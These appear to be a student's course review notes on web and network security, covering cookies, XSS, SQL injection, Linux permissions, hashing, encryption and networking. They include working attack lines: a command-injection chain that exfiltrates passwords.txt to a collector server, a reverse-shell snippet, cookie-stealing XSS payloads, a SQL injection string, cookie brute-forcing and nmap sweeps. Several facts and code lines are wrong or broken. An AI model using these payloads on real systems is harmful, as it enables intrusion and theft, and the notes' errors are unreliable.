# Review 
##### Building a Website
[[Front End (Presentation Layer)]]
1. Your computer ("client") asks for the Client-Side Code (written in HTML HyperText Markup Language) of the website from the "server". Your computer turns this into a picture 
	- HTML: isn't a programming language. it encloses content in tags and website can go through program in any order
	- Javascript adds interactivity (actually a programming language that lets you do arbitrary code) and CSS lets you change how things look
		- Console tab lets you run javascript code (you can call a js function to test out action on your website ie. `refresh_posts()`)
```html
<script> //only works inside script tags
	alert("javascript!") //makes a popup in browser
	var button = document.getElementByID("xyz") //gets HTML element w tag xyz
	
</script>
```
1. The server sends the code to the client and constantly listens for connections 
	- GET requests make the server send you code. POST requests change server (forms tell the action that happens)
	- `ssh nosc1301@student.csci3403.com` puts us into a secure shell in the server 
	- `curl google.com` gets the website
	```python
	from flask import Flask, render_template
	app = Flask(__name__)
	app.route("/")
	def index():
		return "<h1> Welcome </h1>" # send small code to client!
		
	app.route("/login", methods=["get", "post"]) #you can use one route for different kinds of requests!
	def login():
		if request.method == "GET":
			return render_template("login.html", visitors = 5) # send big code to client! 
		else:
			username = request.form['username']
			password = request.form['password']
			
	app.run("0.0.0.0", port=5000) # run website forever (even if script turned off) ('0.0.0.0' means public)
	```

```HTML
<!-- index.html -->
<pre id="chat">

    {{ messages }}

</pre>

<form action="/login" method="post">
    <input type="text" name="username" action="alex">

    <input type="submit" value="Submit">
</form>
```
##### Navigating Websites
- You can have multiple paths by adding a string after webpage
- HTTP (request sent from terminal/html to get code from server): request, headers (give optional metadata about request), user agent (which browser you're running), referer (website that linked to this)
```http. Can run in terminal:
POST /login HTTP/1.1
Host: www.google.com
User-Agent: Firefox 96.0.3 
username:alex
```
	request response = HTTP/1.1 200 OK, <data of the website>
- Cookies (`Set-Cookie`): header values which are saved by browser and sent on each request (mostly used for keeping you logged in) (the only difference between main and private browsing is forgetting the cookies!)
```python
@app.route("/login", methods=["get", "post"])
def login():
	resp.set_cookie("username", username)
	resp = redirect("/", username = username)
	return resp
@app.route("/")
def index():
	username = request.cookies.get("username")
	return render_template("index.html", username=username)
```
	Don't use password or short string as cookie! Because if you know someone's cookie then you can pretend to be logged in 
```python
import random
cookie = random.randbytes(32).hex() #2^32 bits of entropy!
{cookie: "noah"} #if someone wanted to impersonate "noah" they'd have to guess super long value

#Brute Force Cookie from your own account:
import requests
	for i in range(50):
		session = requests.Session()
		session.cookies.set('session_token', str(i), domain='bank.csci3403.com')
		r = session.post('https://bank.csci3403.com/login', data={'username': '1nbs2005', 'password': 'colorado'})
```
# "Hacking"
1. If the cookie ID is super simple (or if it's the same cookie ID for every user), then we can login as any user! Just login under your own account and password, then the website will start sending cookies of your username to server, just edit that username to be someone else's username and you're in (go to inspect, then storage tab on firefox to see all cookies being sent)
2. Remote Code Execution: if the website ever runs command directly on terminal give it what it wants and then chain commands together (here it's running a curl command and then i chain a bunch together) 
	- google.com; cd ../home/admin; cat passwords.txt; curl -X POST \   -H "Content-Type: text/plain" \   --data-binary @passwords.txt \   http://student.csci3403.com:4320/data
	- It sent the data to this server
```python
from flask import Flask, request
app = Flask(__name__)
@app.route("/data", methods =["POST"])
def index():
	print(request.get_data(as_text=True))
	return "d"
app.run("0.0.0.0", port=4320)
```
3. Reverse Shell Exploit: ways to bypass firewall 
	- Bind Shell: send virus to target machine, make target machine act as a server, open a port for the attacker to connect to
	- Reverse Shell: (firewalls sometimes only allow outgoing connections) use virus to make target connect to attacker sever
```python

# REVERSE SHELL: Connect to a remote server run by the attacker, recieve and send info
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((address, port))
client_socket.send(b"> ")
command = client_socket.recv(4096).decode()
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
client_socket.send(result.stdout)
```
# Authentication and Authorization
- Authentication: trying to prove that somebody is who they claim to be (username/password). Usually use cookies which brings up issue of entropy
	- Entropy: measure of randomness (ie. 4 digit pin has 2^14 possibilities/bits, 16 = 2^96 possibilities/bits). Used to quantify how good passwords are `random.randbytes(32).hex()` 
- Authorization: once someone is authenticated, what information do they have access to (important to give everyone the minimum possible amount of access) (especially important when using AI agents)
	- Store the role of all users and check every time they take an action
	- To Break:
		1. Find which paths are available on server(`https://bank.csci3403.com/admin`) 
		2. Who should be allowed to access each of those paths?
		3. Find a path and send it different data from your local machine  (`curl https://bank.csci3403.com/admin` {post request here}) 
			- You can also click on any network request in firefox inspect and click "Edit and Resend"
Always validate on the backend!
# Vocab
- Risk = Impact of bad thing * Probability of it happening 
	1. Estimating Impact of bad thing: Things that would be bad  = CIA
		(Confidentiality (secret info stays secret), Integrity (info on site is accurate), Availability (info available))
	2. Estimating Probability: how difficult is attack to pull off 
# Cross-Site Scripting
Some websites take user input and then display it as HTML (ie. chat app which displays old messages). You can inject HTML or js and have it affect the webpage for every user (including malicious scripts)
```html
<script>document.getElementById("delete_profile").click();</script>
https://photos.csci3403.com/file/"> <script>alert('d')</script>

```
	This will delete every user on the website 
- Prevention: 
	- use escaped characters when printing "<" or ">" on website (or just use render_template!) `post = post.replace("<", "&lt;")`
	- Mixed-Content Policy: can't send requests from encrypted websites to unencrypted one
	- Cross-Origin Resource Sharing: won't send requests to another webpage without first sending an OPTIONS request
- Uses: inject JS to get someone's computer to send their cookie to your server
	- Send someone a malicious XSS link that they click (and then the xss is in the link itself and gets injected into the page (bc a lot of pages put the search terms in the links))
```js
<script>document.location = "https://my_domain.com/" + document.body.innerHTML
+ document.cookie<\script>
```
# Static Analysis
Look for bugs using a set of rules (but never run code)
- Look for template syntax that disables escaping, such as {{{ ... }}}, @Html.Raw(...), or |safe.
# SQL Injection
```python
import sqlite3
con = sqlite3.connect("users.sqlite3")
sql = "SELECT " + username " FROM TABLE WHERE password = " + password
con.execute(sql) # opens up to security vulnerabilities 
username = "admin'--" # will let you not put in password
con.execute("SELECT uname=? FROM table=?", (username, table)) # make it safe
```
- SQL Union Attacks: if you want to steal data from server, append UNION expression onto end 
```sql
"'UNION SELECT username FROM users WHERE username = 'admin'"
```
# Linux Permissions
Every program runs as user. Each child program inherits user from parent. Root is superuser: can create, delete, run programs as other users
[[Terminal Commands]]
- Vulnerabilities: a lot of web-processes will be run as root which means a hacker could do anything if they get in (run `whoami` on exploited terminal to find out)
- Permissions: Read (read file), Write (create files), Execute (read files and subdirectories)
	- If you're the owner you get all, same group gets read + execute, other gets read (run `ls -al` to see user, group, read r, write w, execute x)
		Set in hex: ![[Screenshot 2025-10-24 at 10.10.28 AM.png]]
		`chmod 000 test.txt` no user can do anything
		`chmod 400 test.txt` user can read but no one else can do anything
		`chmod 777 test.txt` all users have all permissions
- Shadow File (stores hashed linux users passwords)
```python
# example
alice:$6$.0H/Hix2jeogYVy9$FNxGUxkIVdVemiEIJIEOhnbDjssmep23ir0548i03jnwdewdfkbUoXo2/R7YXG0wugnxx8DlRS/fAS7Y70:20372:0:99999:7:::
# translation (6 = SHA512)
username:$hash_type$salt$hashed_password:last_changed:min:max:warn:::
```
# [[Hash Table]]
Most common algorithm is SHA256. Gives fixed-length seed (deterministic, irreversible)
`echo "test" | sha256sum` = 23095873285739df30r9203dfwf209234
- Uses: tell if 2 pieces of data are equal without knowing data, make sure data is not modified during transit, hash all viruses we know about and then check if our data matches that hash, ALWAYS HASH ALL PASSWORDS
- If list of hashes is stolen:
	- Now we're really good and can check 24 BILLION passwords a second! Use PCrypt instead (because its designed to be a much slower hash)
	- If many uses have same pwd this also gives clue
		- Salt: add random salt to password before you hash
# Encryption
Make data unreadable to anyone without a secret key (not hashing bc its reversible! ie. varying output lengths)
- Jargon: Plaintext = The original message, Ciphertext = The encrypted message![[Screenshot 2025-10-31 at 1.38.39 PM.png]]
- Symmetric Encryption: use same key to encrypt and decrypt (XOR the plaintext w the key bc XOR is reversible) (AES-128 = most popular)
	Leads to the same ciphertext everytime )(ie. attacker can use the cyphertext w/o having to know what it means or make inferences)
	- Use a nonce! Add a random, non-secret nonsense value called a “nonce” to each message
NOTE: you need to keep track of all formats of data (a lot of times these random strings will be in base 64)
	Asymmetric Encryption: encryption key is different from decryption key (RSA randomly generates 2 keys)
```python
# Decrypting AES
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = bytes.fromhex('464f7549aeb0723b94f5ca612ff62188')
nonce = bytes.fromhex('552f42ba8aa8fd11ecf12ef6')
ciphertext = bytes.fromhex('8b1de0b2c5470c1a78f0cb87b8a4e3a2f0a651c697044234359a86589cfbc965cbbd25fd337d8d4e80f6d8efaf4b76b624736745f323cb6b6f29292af49f153b9e519c0dcccafc51b7e5d7afa3c112c905eec0154643304301675f45526bf7b20da94cfa287fdbde7cdf1c09')
aesgcm = AESGCM(key)
plaintext = aesgcm.decrypt(nonce, ciphertext, None)
print(plaintext.decode())

# Encrypting a message using RSA
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import os
import base64
ssh_pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+BPEfQGiyyZghKeB1IJrk1DG3zHJ27uBTPJUEH0yVKgPhEV/eh1ETOXQTGIiVrBEvwMUygCZYxMSo6tq/42bFK1TzmcBEAReiZFezWyFUiZtit5HSUR492+Y46GLuF7+ZXtozSBLVWthEoVIFBy2J2+DedUE5l7WEn2bvg4vjiKT2+oCv6zlmwpGRpY6b0ZZ6VM1tcsETms7RsGQZi4ceiSCUlp5JzNxgbh7FgqUcQ1pmuupXi0JIBbkaj2jrys8XPm9cs1Vel3tN1+6Ncqd7JBwKsI31CzzdeIdmmYbE0+Jr1J/jrprVDyEgI/czf20wlb5+1lhPqV67MdsaY8rZ"
public_key = serialization.load_ssh_public_key(ssh_pubkey.encode())
aes_key = os.urandom(16)
print(f"Your AES key (hex): {aes_key.hex()}")
encrypted_key = public_key.encrypt(
    aes_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
encrypted_key_b64 = base64.b64encode(encrypted_key).decode()
print(f"\nBase64-encoded encrypted key:\n{encrypted_key_b64}")
```
# Networking
Each computer has an IP address (public and private) to identify it (run `ifconfig` to see address)
- Inet = personal to send from 1 computer to another
- Broadcast = send to a bunch of different computers
- Domain Name System (DNS) server (usually just your wifi router which can go ask a bigger DNS if it needs to)
	People can't remember IP addresses so map them to websites (google.com, test.com)
	- You can create a static domain (spotify) and have its IP address dynamically change (ie. if server goes down), just have to update DNS (usually changes every minute for large devices)
	`dig google.com`
	- We had IPV4 but ran out, (32 bits) now we have IPV6 (128 bits) but its ugly (also much harder to shadow ban bc people can just keep making addresses)
- Ports: address gets you to server, port gets you to service on server (defaults: SSH = 22, HTTP = 80, HTTPS = 443) but you could host a server on any port and be fine 
	If you type `google.com` it defaults to `google.com/80`
- CIDR Ranges: block of IP addresses (ie. 192.168.0.0/24 covers 256 addresses all w same first 24 bits in binary)
	- /17 network is 2^17 computers. (/0 is entire internet!)
- Private IP Addresses: there are only 4B possible IP's so private IP's reuse numbers within their own server
	- Send message to router w private IP -> router converts to public -> sends to server -> sends response back to og using port
		- NAT (Network Address Translation): translate private to public IP
	- You can use Private IP's to communicate between computers on same network (don't need NAT)
- VPN: virtual private network (send request from router somewhere else in world)
	- Very useful because forces all machines on private network to have private IP (can't communicate outside of it). Can hide websites behind VPN (so random hackers can't see it)
	- Helps save on bandwidth (you don't have to use your own routers, just use Cisco)
- Hacks: 
	1. Every time 2 machines connect they are sharing a port. We can get access to someone's IP addresses and then try a bunch of ports
	2. IP gives you location of machine 
	3. IP Scanning: Brute force all IPV4 (there are only 4 million). make connections to all of them and see whats there (and all their ports) (ie. they have an SSH server, try to break in). Many ppl have forgotten to secure their network for their webcams!!! You can just see them 
		- Many ppl didn't secure their remote desktop network so you can see those too (and just need to brute force the pwd to get in)
```python
# Find server on network running on port 23:
nmap -p 23 192.168.2.0/24
# Find server on network that is running a website:
nmap -p 80 192.168.2.0/24
# Find server on network running database
nmap -p 3306,5432,1433,27017 192.168.2.0/24
```
# Firewall
Read packets as they come in/leave device and figure out whether to allow them or block them. Every major network point has a firewall 
1. Ingress = incoming, Egress = outgoing.
2. Default rule blocks everything. Then tcp:80 = allows. Exceptions made for specific programs!
# Man in the Middle (On-Path Attacks)
You're talking to a website and there is someone in the middle listening to everything (safe: internet provider, organization, search engine, website) (evil: )
1. Any device that routes traffic is on the network path and can read/modify any messages passed back and fourth
2. Packet Sniffing: Wireshark, tcpdump. A router can see every single packet that gets sent from your laptop to website (which is why ssl/https/tsl is important). You need to control the router for this to work though! 
	- Router owner can't see your actual packets but they can see all connections your computer is requesting (ie. they could figure out if you're going to an ellicit website!)
# SSH Tunneling
If you connect to a private subnetwork, all machines on the subnetwork can only connect to each other (not the internet) so program the bastion to just route all your commands to another machine on private subnet 
1. Bastion: server which is connected to public internet and private subnetwork (to allow access). You connect to bastion, then to any private services (but your laptop can't directly connect!)
	- What if you wanted to directly connect to something directly in private subnet
		- Run command that tells SSH client to start listening on a port (on your device)
		- Take any traffic that's sent to that port and just forward it to the server (and tell server to give it to specific machine)
```
ssh nosc1301@server -L 120:202:0202 
```
![[Screenshot 2025-11-22 at 9.19.31 PM 2.png]]
# Takeaways
1. Never make any security changes to client-side code (HTML)!
2. Just look at the HTTP if you're looking for smth! (ie. inspect element, go to network, see post request for login, go to "request" field, look at data sent to get password)
3. Always hit "no" on cookies! (it doesn't do much)
4. Always validate on the backend!
5. Important commands: **pwd**, **cp**, **cat**, **grep**, **man**
6. curl http://4flgfoswjlzecgbdu2gxkcnntv6nqzszdkq5mtoe5i.csci3403.com/script/download
7.  Many ppl have forgotten to secure their network for their webcams!!! You can just see them (by doing IP scanning)